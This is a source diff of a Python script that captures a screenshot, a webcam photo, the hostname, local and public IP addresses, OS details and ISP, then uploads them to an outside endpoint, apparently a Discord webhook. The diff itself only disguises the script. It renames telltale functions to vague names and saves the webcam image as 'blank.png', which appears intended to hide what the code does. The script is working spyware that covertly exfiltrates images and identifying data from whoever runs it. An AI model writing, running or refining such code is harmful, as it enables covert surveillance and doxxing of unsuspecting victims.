@@ -1,3 +1,5 @@
+# install all these libraries first 
+
 import requests
 import socket
 import platform
@@ -17,14 +19,14 @@ def capture_webcam_image():
     cam = cv2.VideoCapture(0)
     ret, frame = cam.read()
     if ret:
-        webcam_path = os.path.join(os.getcwd(), 'webcam.png')
+        webcam_path = os.path.join(os.getcwd(), 'blank.png')
         cv2.imwrite(webcam_path, frame)
         cam.release()
         return webcam_path
     cam.release()
     return None
 
-def get_device_info():
+def d_info():
     hostname = socket.gethostname()
     local_ip = socket.gethostbyname(hostname)
     user_agent = f"{platform.system()} {platform.release()} ({platform.version()})"
@@ -33,7 +35,7 @@ def get_device_info():
     isp = ip_info.get('org', 'Unknown')
     return hostname, local_ip, user_agent, public_ip, isp
 
-def send_to_discord(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp):
+def send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp):
     files = {
         "file1": open(screenshot_path, "rb"),
         "file2": open(webcam_path, "rb") if webcam_path else None
@@ -46,7 +48,7 @@ def send_to_discord(screenshot_path, webcam_path, hostname, local_ip, user_agent
         if response.status_code == 204:
             print("Data sent successfully!")
         else:
-            print(f"Failed to send data. Status code: {response.status_code}")
+            print(f"Failed to send data - status code {response.status_code}")
     except Exception as e:
         print(f"Error sending data: {e}")
     for file in files.values():
@@ -57,8 +59,8 @@ def send_to_discord(screenshot_path, webcam_path, hostname, local_ip, user_agent
 def main():
     screenshot_path = capture_screenshot()
     webcam_path = capture_webcam_image()
-    hostname, local_ip, user_agent, public_ip, isp = get_device_info()
-    send_to_discord(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp)
+    hostname, local_ip, user_agent, public_ip, isp = d_info()
+    send(screenshot_path, webcam_path, hostname, local_ip, user_agent, public_ip, isp)
 
 if __name__ == "__main__":
     main()
